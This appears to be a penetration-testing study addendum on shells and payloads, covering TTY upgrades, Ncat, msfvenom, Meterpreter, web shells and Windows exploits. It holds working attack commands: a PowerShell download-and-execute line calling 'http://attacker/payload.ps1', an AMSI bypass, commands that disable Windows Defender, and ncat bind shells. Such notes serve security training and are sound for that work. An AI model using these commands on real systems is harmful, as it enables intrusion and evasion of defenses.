# ADDENDUM 02: Shells & Payloads — Advanced Techniques

## TTY Stabilization Alternatives (When Python NOT Available)

| Method | Command | Notes |
|--------|---------|-------|
| `/bin/sh` interactive | `/bin/sh -i` | Simplest, works on most Linux |
| Perl (one-liner) | `perl -e 'exec "/bin/sh";'` | Commonly pre-installed |
| Perl (inline) | `perl: exec "/bin/sh";` | Alternative syntax |
| Ruby | `ruby: exec "/bin/sh"` | If Ruby available |
| Lua | `lua: os.execute('/bin/sh')` | Common on embedded systems |
| AWK | `awk 'BEGIN {system("/bin/sh")}'` | Nearly ubiquitous on Unix |
| Find trick | `find . -exec /bin/sh \; -quit` | Works even when other methods fail |
| Vim escape | `vim -c ':!/bin/sh'` then `:set shell=/bin/bash` then `:shell` | Requires vim installed |

```bash
# Check what interpreters are available
which perl ruby lua awk python python3 vim
```

## Non-TTY Shell Concept

A **non-TTY shell** lacks a terminal emulator. Characteristics:
- No job control (no `fg`, `bg`, `Ctrl+Z`)
- No signal handling
- No terminal size
- No tab completion

**Why `su`/`sudo`/`sudo -l` fail:**
1. `su` requires a TTY to read password from `/dev/tty`
2. `sudo` enforces `requiretty` by default
3. Service accounts (apache, www-data) configured with `/usr/sbin/nologin`

**Key: `sudo -l` requires a stable interactive shell** — will fail in non-TTY shells.

**Check:** `tty` → "not a tty" means you need to upgrade.

## CMD vs PowerShell Decision Framework

| Factor | CMD | PowerShell |
|--------|-----|------------|
| **When to use** | Older hosts, simple interactions, batch files, exec policy blocks, stealth | Cmdlets, .NET objects, cloud services, when stealth less concern |
| **I/O model** | Text-based | .NET object-based |
| **Command history** | No | Yes (Get-History, F7) |
| **Execution Policy** | Not affected | Affected (Bypass/Unrestricted) |
| **UAC** | Not affected | Affected |
| **Availability** | All Windows (XP+) | Not on XP/older |
| **Logging** | Minimal | Extensive (ScriptBlock, Module, Transcription) |
| **AV Detection** | Less likely | More likely (AMSI) |
| **Remote Execution** | Limited (psexec, wmic) | Built-in (Enter-PSSession via WinRM) |

### Quick Decision Guide
```
Windows XP/2000 or older? → CMD
PowerShell blocked by exec policy? → CMD (or bypass: -ExecutionPolicy Bypass)
Need .NET access / advanced features? → PowerShell
Stealth primary concern? → CMD
Otherwise → PowerShell (faster, more powerful)
```

### PowerShell Execution Policy Bypass
```powershell
powershell -ExecutionPolicy Bypass -Command "Get-Process"
powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

### AMSI Bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## PowerShell Core on Linux
```bash
# Install on Linux
sudo snap install powershell --classic
pwsh  # Launch PowerShell Core
pwsh -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"
```
- Avoids Windows-targeted AV/EDR
- Cross-platform engagements
- Native cloud management modules (Az, AWSPowerShell)

## WSL as Attack Vector
| Capability | Security Impact |
|------------|----------------|
| Network requests NOT parsed by Windows Firewall | WSL2 has own virtual network adapter |
| Network requests NOT scanned by Defender | Traffic from WSL not inspected |
| Run Linux binaries natively | Compile/execute Linux tools without dual-boot |
| Python3 via WSL | Full Python without installing Python for Windows |
| File system access | Access Windows files via `/mnt/c/` |
| EDR blind spot | Limited visibility into WSL process execution |

```cmd
:: Check WSL
wsl --list
Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

## GNU Netcat vs Ncat

| Feature | GNU Netcat | Ncat (Nmap) |
|---------|------------|-------------|
| **Close on EOF** | `-q 0` | `--send-only`, `--recv-only` |
| **SSL/TLS** | No | Yes (`--ssl`) |
| **IPv6** | Limited | Full (`-6`) |
| **SOCKS Proxy** | No | Yes (`--proxy-type socks4/socks5`) |
| **HTTP Proxy** | No | Yes (`--proxy-type http`) |
| **Connection Brokering** | No | Yes (`--broker`) |
| **Access Control** | No | Yes (`--allow`, `--deny`) |
| **Chat Mode** | No | Yes (`--chat`) |

**On Pwnbox:** `nc`, `ncat`, `netcat` ALL point to Ncat.

```bash
# Ncat SSL
ncat -lvp 443 --ssl -e /bin/bash
ncat --ssl 10.10.14.1 443

# Ncat send/recv only
ncat --send-only 10.10.14.1 4444 < file.txt
ncat --recv-only -lvp 4444 > received_file.txt

# Ncat brokering
ncat -lvp 8080 --broker --keep-open
```

## Payload Naming Convention
`<platform>/<arch>/<type>/<connection>` — e.g., `windows/x64/meterpreter/reverse_https`

| Directory | Platform |
|-----------|----------|
| `linux/` | Linux (x86, x64, ARM, MIPS) |
| `windows/` | Windows (x86, x64) |
| `osx/` | macOS |
| `android/` | Android |
| `apple_ios/` | iOS |
| `java/` | Java |
| `php/` | PHP |
| `nodejs/` | Node.js |
| `python/` | Python |
| `mainframe/` | IBM z/OS |
| `bsd/` | FreeBSD, OpenBSD, NetBSD |
| `unix/` | Generic Unix |
| `multi/` | Multi-platform |

## MSFVenom Flags Deep Breakdown
| Flag | Description |
|------|-------------|
| `-p` | Payload |
| `-f` | Output format (elf, exe, raw, perl, python, ruby, asp, aspx, jsp, war, dll, macho, vba, psh) |
| `>` | File redirection |
| `LHOST` | Attacker IP |
| `LPORT` | Listener port |
| `-e` | Encoder |
| `-i` | Encoding iterations |
| `-b` | Bad characters |
| `--platform` | Target platform |
| `-a` | Architecture |
| `--smallest` | Smallest possible payload |
| `-k` | Keep template functioning |
| `-x` | Custom executable template |
| `EXITFUNC` | Exit function (thread, process, seh, none) |
| `PrependMigrate` | Auto-migrate to another process |
| `PrependMigrateProc` | Process name to migrate to |

## Staged vs Stageless Decision Framework
| Factor | Staged (`/`) | Stageless (`_`) |
|--------|-------------|----------------|
| **Bandwidth** | Better (small initial stager) | Worse (full payload at once) |
| **Reliability** | Needs reliable connection | Better for unstable connections |
| **Evasion** | More network traffic (stages) | Less network traffic |
| **Use case** | Space-constrained exploits | Web shells, stable access |

```
Space-constrained exploit? → Staged
Unstable network? → Stageless
AV/EDR evasion primary concern? → Stageless
Otherwise → Either (staged is traditional default)
```

## Stagers, Stages & Middle Stagers
- **Stagers** (~300-800 bytes): Small reliable code that initiates outbound connection, sets up channel for stage delivery. Types: reverse_tcp, bind_tcp, reverse_http, reverse_https, findtag
- **Stages** (100-300KB): Downloaded by stagers, advanced features no size limits (Meterpreter, VNC). Components: stdapi, priv, extapi, kiwi, sniffer, vnc, incognito, powershell
- **Middle Stagers**: Handle partial recv() calls for large payloads, allocate RWX memory, error handling/retries

## Windows NX vs NO-NX Stagers
| Factor | NO-NX Stager | NX Stager |
|--------|-------------|-----------|
| **Size** | Smaller (~300-400B) | Larger (~500-700B) |
| **Memory** | Writes to existing executable | Allocates RWX via VirtualAlloc |
| **Compatibility** | Older systems without DEP | Modern systems with DEP |
| **Default** | Legacy | YES — NX + Win7 compatible |

## Meterpreter Architecture
- **DLL injection** — injected into existing process, no new process created
- **In-memory only** — no disk traces, forensically clean
- **AES-256 encryption** — all communication encrypted
- **Dynamic load/unload** — extensions loaded at runtime
- **Process migration** — survive reboots/crashes

### Initialization Sequence
1. Target executes initial stager (bind/reverse/findtag/passivex)
2. Stager loads DLL with Reflective Loader (handles loading/injection)
3. Meterpreter core initializes, establishes AES link, sends GET
4. Metasploit configures client
5. Extensions loaded (always `stdapi`, `priv` if admin rights)

### Reflective DLL Injection vs Traditional
| Traditional | Reflective |
|------------|------------|
| Requires WriteProcessMemory | Writes itself to memory |
| Requires LoadLibrary | Self-maps without OS loader |
| Visible to EDR hooks | Bypasses LoadLibrary monitoring |
| Requires import table | Self-contained |

## Why Port 443
- HTTPS rarely blocked by outbound firewalls
- Commonly allowed for web browsing
- Blends with legitimate HTTPS traffic
- **Caveat:** DPI/Layer 7 firewalls may detect non-HTTPS on 443 (MSF reverse_https doesn't do real TLS handshake)

## Windows Defender Disable
```powershell
# Real-time disable (requires Admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Check Tamper Protection
Get-MpComputerStatus | Select-Object IsTamperProtected

# Additional disables
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "C:\Temp\payload.exe"
```

## Web Shell Toolkits

### Laudanum
- Location: `/usr/share/laudanum/`
- Platforms: ASP, ASPX, JSP, PHP, ColdFusion
- Edit `allowedIps` array to restrict access
- **WARNING:** ASCII art header is heavily signatured — remove it!

### Antak Webshell (Nishang)
- Location: `/usr/share/nishang/Antak-WebShell/`
- ASP.NET with PowerShell UI
- Features: file upload/download, SQL queries, encode-and-execute

### WhiteWinterWolf PHP Shell
- Burp content-type bypass: `application/x-php` → `image/gif`

### Web Shell Considerations
- Web apps may auto-delete files after pre-defined periods
- Limited interactivity: no `cd`, chained commands may fail
- Browser instability
- **Always convert to proper reverse shell ASAP**

## TTL-Based OS Fingerprinting
| OS | TTL |
|----|-----|
| Windows | 32 or 128 (typically 128) |
| Linux | 64 |
| Cisco | 255 |
| FreeBSD | 64 |
| macOS | 64 |

```bash
ping <target>  # Look at TTL in response
```

## Windows Prominent Exploits Catalog
| CVE | Name | Impact |
|-----|------|--------|
| MS08-067 | NetAPI | Conficker, Stuxnet — Server service RPC overflow |
| MS17-010 | EternalBlue | WannaCry, NotPetya — SMBv1 RCE |
| CVE-2019-0708 | BlueKeep | RDP RCE, wormable, pre-auth |
| CVE-2020-1350 | Sigred | DNS Server RCE, CVSS 10.0, wormable |
| CVE-2020-1472 | Zerologon | DC takeover, no auth required, CVSS 10.0 |
| CVE-2021-1675 | PrintNightmare | Print Spooler RCE, unauthenticated |
| CVE-2021-36934 | SeriousSam | SAM/SYSTEM hive access via VSS |

## Social Engineering Delivery Vectors
- **Email attachments:** Malicious Office docs (macros), PDF exploits, .exe/.scr disguised as legitimate, password-protected archives, LNK files, ISO/IMG files
- **Download links:** Phishing websites, drive-by downloads, cloud storage links (trusted domains), Pastebin scripts, GitHub Gists
- **USB dead drops:** Infected drives, Rubber Ducky, Bash Bunny, O.MG Cable
- **Combined with MSF:** `exploit/windows/fileformat/office_*`, `exploit/windows/fileformat/adobe_*`, msfvenom-generated payloads

## Terminal Emulator Catalog
| Platform | Terminals |
|----------|-----------|
| **Windows** | Windows Terminal, cmder, PuTTY, kitty, Alacritty |
| **Linux** | xterm, GNOME Terminal, MATE Terminal, Konsole, Terminator |
| **macOS** | iTerm2, Terminal.app, Kitty, Alacritty |

## Command Language Interpreter Identification
```bash
# Linux
echo $SHELL           # Check SHELL variable
env | grep SHELL      # All env vars
ps aux | grep -E '(bash|sh|zsh)'  # Running processes
cat /etc/shells       # Available shells

# Windows
echo %COMSPEC%        # Should show cmd.exe path
tasklist | findstr /i "cmd powershell"  # Running interpreters
```

| Interpreter | Prompt Character |
|-------------|-----------------|
| bash | `$` |
| root bash | `#` |
| zsh | `%` |
| CMD | `>` |
| PowerShell | `PS ...>` |

## Bind Shell Challenges
| Challenge | Impact |
|-----------|--------|
| Pre-existing listener required | If no listener, connection fails |
| Strict incoming firewall rules | Non-standard ports blocked |
| NAT/PAT blocking | External attacker cannot reach internal IPs |
| OS firewalls | Windows Firewall, iptables block incoming |
| IDS/IPS detection | New listeners flagged |

**When bind shells work:** Internal network access, pivoting, DMZ hosts, no firewall environments. **Default to reverse shells** in almost all scenarios.
